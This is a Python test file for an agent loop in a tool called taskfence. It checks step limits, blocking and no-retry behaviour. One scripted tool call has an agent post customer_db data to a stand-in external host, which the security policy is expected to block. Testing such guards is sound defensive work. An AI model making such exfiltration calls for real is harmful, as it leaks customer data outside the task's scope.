"""OllamaAgent tests (kit Prompt D3): loop behavior with the chat call
monkeypatched, plus one real-model test that only runs when Ollama is up."""

import httpx
import pytest

from taskfence.agent import MAX_STEPS, OllamaAgent


class FakeChat:
    """Scripted /api/chat responses."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, messages, tools):
        self.calls.append([dict(m) for m in messages])
        if not self.responses:
            return {"message": {"content": "done"}}
        return self.responses.pop(0)


TOOL_CALL_MSG = {"message": {"tool_calls": [{"function": {
    "name": "read_file",
    "arguments": {"path": "drive/sales_report_q3.csv"}}}],
    "content": ""}}
FINAL_MSG = {"message": {"content": "task complete"}}


def test_loop_stops_at_max_steps(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([TOOL_CALL_MSG] * (MAX_STEPS + 2))
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("any task")
    assert len(fake.calls) <= MAX_STEPS
    assert final.startswith("Stopped at max steps")


def test_block_is_fed_back_and_stops_not_retried(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([
        TOOL_CALL_MSG,               # first call -> ALLOW (read)
        {"message": {"tool_calls": [{"function": {
            "name": "post_external",
            "arguments": {"url": "https://collect.example.invalid/ingest",
                          "payload": "data",
                          "source_assets": ["customer_db"]}}}],
            "content": ""}},         # second call -> BLOCK
    ])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("Summarize Q3 sales.")
    decisions = [step["decision"] for step in transcript]
    assert decisions == ["ALLOW", "BLOCK"]
    assert final.startswith("This request was denied by security policy")
    # Stop-on-BLOCK: exactly two chat calls, no third attempt after the deny
    # (the observation was appended to `messages` before the loop returned).
    assert len(fake.calls) == 2
    # And no retry: post_external appears exactly once in the transcript.
    assert [t["tool"] for t in transcript].count("post_external") == 1


def test_no_tool_calls_returns_final_message(agent_client, monkeypatch):
    agent = OllamaAgent(agent_client)
    fake = FakeChat([FINAL_MSG])
    monkeypatch.setattr(agent, "_chat", fake)
    transcript, final = agent.run("any task")
    assert transcript == [] and final == "task complete"


def _ollama_reachable() -> bool:
    try:
        httpx.post("http://localhost:11434/api/version", timeout=1)
        return True
    except httpx.HTTPError:
        return False


@pytest.mark.ollama
@pytest.mark.skipif(not _ollama_reachable(),
                    reason="Ollama not reachable at localhost:11434")
def test_real_ollama_loop_completes_scenario_a(agent_client):
    agent = OllamaAgent(agent_client)
    transcript, final = agent.run(
        "Summarize Q3 sales and post it to #sales.")
    assert any(step["decision"] == "ALLOW" for step in transcript)
    assert not final.startswith("Stopped at max steps")
